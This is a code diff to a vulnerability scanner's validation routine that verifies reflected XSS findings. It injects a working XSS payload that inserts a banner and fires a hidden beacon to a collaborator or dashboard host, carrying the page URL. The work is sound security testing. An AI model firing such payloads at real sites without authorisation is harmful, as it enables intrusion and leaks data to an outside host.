@@ -59,18 +59,41 @@ class ValidationManager:
             parsed = urlparse(url)
             q = parse_qs(parsed.query, keep_blank_values=True)
             param = finding.affected_parameter or next(iter(q.keys()), 'q')
-            # Inject a safe reflected payload containing the marker
-            payload = f"\"><img src=x onerror=window.__modscan_xss=1;/*{marker}*/>"
+            # Build OOB beacon base from config (collaborator or local dashboard)
+            collab = (self.scanner.config.get('collaborator', {}) or {}).get('base_domain')
+            scheme = 'https' if ((self.scanner.config.get('collaborator', {}) or {}).get('https')) else 'http'
+            if not collab:
+                host = self.scanner.config.get('dashboard_host') or '127.0.0.1'
+                port = str(self.scanner.config.get('dashboard_port') or '8000')
+                collab = f"{host}:{port}"
+            oob = f"{scheme}://{collab}/oob/xss/{marker}"
+
+            # Inject a safe reflected payload that visibly inserts a banner and loads a blind beacon.
+            # We use backticks to assign outerHTML; include a hidden img to call our OOB endpoint.
+            payload = (
+                f"\"><img src=x onerror=\"this.outerHTML=`<div id=MODSCAN_XSS "
+                f"style=font:700 14px/1.2 system-ui;color:#10b981;background:#052e16;padding:6px 10px;"
+                f"border-radius:6px>MODSCAN XSS VERIFIED • {marker}</div><img src='{oob}?u=${{encodeURIComponent(location.href)}}' style='display:none'>`\">"
+            )
             q[param] = [payload]
             new_query = urlencode(q, doseq=True)
             test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
             h = await self.scanner._get_auth_headers(test_url)
             async with session.get(test_url, headers=h, timeout=15) as r:
                 txt = await r.text()
-            verified = (marker in txt) or ('__modscan_xss' in txt)
+            # Verify by presence of our unique marker in the reflected HTML (attribute value)
+            verified = (marker in txt)
             if verified:
+                try:
+                    import asyncio as _asyncio
+                    # Small delay to ensure client-side banner insertion renders before capture
+                    await _asyncio.sleep(0.4)
+                except Exception:
+                    pass
                 shot = await self.scanner._take_screenshot(test_url)
-                finding.evidence = f"{finding.evidence} | Verification: visible reflected XSS marker {marker}. Screenshot: {shot}".strip()
+                finding.evidence = (
+                    f"{finding.evidence} | Verification: visible MODSCAN banner {marker}. Screenshot: {shot}"
+                ).strip()
                 finding.confidence = max(finding.confidence, 0.9)
                 finding.screenshot_path = shot or finding.screenshot_path
         except Exception as e:
